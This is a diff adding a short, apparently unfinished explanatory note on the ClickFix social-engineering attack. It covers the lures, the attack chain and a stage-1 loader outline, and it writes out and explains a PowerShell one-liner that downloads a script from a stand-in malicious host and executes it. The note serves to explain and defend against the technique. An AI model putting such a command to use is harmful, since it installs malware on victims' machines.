@@ -1,0 +1,72 @@
+ClickFix is a social engineering + script based attack, in which the attackers tricks the victim/users to copy-paste malicious command (usually into Run diagonal/CMD/Powershell/Terminal) that downloads a malware.
+
+* Instead of exploiting the vulnerabilites in the softeare, attacker makes the user to execute malicious commands themselves, so that the threat actor can bypass the security controls like firewall/email security solutions.
+
+The attackers typical lures the victim as:
+- Fix your PC
+- Update browser
+- Install codec
+- captcha verification
+- Zoom audio fix
+
+  So Basically, the Attacker/Threat actor tells the user to "FIX" something, so here, FIX is the attack here.
+  Victim copies the command --> runs it --> malware downloads.
+
+Attack Chain:
+Website / Email lure
+        ↓
+Fake instruction "Press Win + R"
+        ↓
+User pastes command
+        ↓
+PowerShell / CMD executes
+        ↓
+Payload downloaded
+        ↓
+Second stage executed
+        ↓
+Persistence / C2 connection.
+
+1. Initial Access:
+  Press Windows + R
+  Paste below:
+  powershell -c "iwr http://malicious.site/file.ps1 | iex"                  ==>    Meaning:    Download file.ps1 & execute immediately
+user runs --> Powershell executes.
+
+powershell                          ==> launches powershell
+-c ""                               ==> run what ever is there in the "STRINGS" as command
+iwr (Invoke-WebRequest)             ==> Download file
+|                                   ==> Pipe output
+iex                                 ==> invoke-Expression (Execute).
+
+2. Stage 1 Loader (Downloader)
+  The script usually:
+    Checks sandbox
+    Uses token parameters
+    Downloads second payload
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
